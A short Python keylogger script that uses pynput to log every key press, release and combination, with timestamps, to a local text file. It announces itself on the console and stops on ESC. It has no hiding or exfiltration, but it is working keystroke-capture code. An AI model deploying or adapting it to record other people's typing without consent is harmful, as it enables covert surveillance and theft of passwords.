#!/usr/bin/env python3
from pynput import keyboard
import datetime
import os

# File to save the keystrokes
log_file = "keystrokes.txt"

# Set to keep track of currently pressed keys (for combinations)
current_keys = set()

def get_timestamp():
    """Return current timestamp in a readable format."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    """Function called when a key is pressed."""
    try:
        # For regular keys
        key_char = key.char
        # Add to currently pressed keys
        current_keys.add(key_char)
    except AttributeError:
        # For special keys
        key_char = str(key).replace("Key.", "")
        # Add to currently pressed keys
        current_keys.add(key_char)
    
    # Record the keystroke with timestamp
    log_keystroke(f"[PRESS] {key_char}")
    
    # If combination detected (more than one key pressed)
    if len(current_keys) > 1:
        combo = " + ".join(sorted(current_keys))
        log_keystroke(f"[COMBO] {combo}")

def on_release(key):
    """Function called when a key is released."""
    try:
        # For regular keys
        key_char = key.char
        # Remove from currently pressed keys
        if key_char in current_keys:
            current_keys.remove(key_char)
    except AttributeError:
        # For special keys
        key_char = str(key).replace("Key.", "")
        # Remove from currently pressed keys
        if key_char in current_keys:
            current_keys.remove(key_char)
    
    # Record the key release with timestamp
    log_keystroke(f"[RELEASE] {key_char}")
    
    # Exit on pressing 'esc'
    if key == keyboard.Key.esc:
        log_keystroke("[INFO] Keylogger stopped")
        return False

def log_keystroke(text):
    """Write keystroke to the log file with timestamp."""
    timestamp = get_timestamp()
    with open(log_file, "a") as f:
        f.write(f"{timestamp}: {text}\n")

def main():
    # Create log file with header
    with open(log_file, "w") as f:
        f.write(f"=== Keylogger Started {get_timestamp()} ===\n")
    
    print(f"Keylogger started. Logging to {os.path.abspath(log_file)}")
    print("Press ESC to stop the keylogger.")
    
    # Start listening for keystrokes
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()
    
    print(f"Keylogger stopped. Log saved to {os.path.abspath(log_file)}")

if __name__ == "__main__":
    main()